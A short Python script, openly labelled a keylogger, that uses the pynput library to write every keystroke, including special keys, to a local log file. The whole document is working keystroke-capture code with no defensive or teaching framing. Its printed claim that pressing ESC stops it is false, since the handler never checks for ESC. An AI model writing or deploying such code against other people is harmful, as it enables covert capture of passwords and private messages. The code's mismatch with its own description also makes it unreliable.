from pynput import keyboard

# File to save the logs
LOG_FILE = "key_log.txt"

def on_press(key):
    try:
        # Try getting the alphanumeric key
        with open(LOG_FILE, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys
        with open(LOG_FILE, "a") as f:
            f.write(f" [{key}] ")

def main():
    print("🔐 Keylogger is running... (Press ESC to stop)")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
